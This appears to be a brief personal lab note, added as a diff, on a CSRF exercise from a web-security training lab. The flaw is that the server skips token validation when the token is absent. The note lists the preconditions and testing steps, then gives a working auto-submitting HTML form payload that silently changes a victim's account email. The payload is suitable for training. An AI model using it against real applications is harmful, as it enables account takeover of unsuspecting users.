@@ -1,0 +1,30 @@
+
+
+                    LABS #3 :- token validation depends on token being present 
+
+In order to perform csrf there must be :-
+i) A relevant action
+ii) Cookie-based session handling
+iii) No unpredictable req params.. (csrf token is not mandatory) 
+
+Testing csrf token :- 
+1) Remove the csrf token and see if the app accepts it.. (yes hence its vulnerable )
+2) test req method from post  to get
+
+payload :-- 
+<html>
+    <body>
+        <h1>You have been hacked !! </h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0a8000f30445b20a82ea4c4000540082.web-security-academy.net/my-account/change-email"
+              method="post" id="csrf-form" target="csrf-iframe">
+              <input type="hidden" name="email" value="hack@gmail.com">
+        </form>
+        <script>document.getElementById('csrf-form').submit()</script>
+    </body>
+</html>
+
+// it worked because csrf token is implemented but server is not validating it hence it's vulnerable and we exploited it..
+
+
+
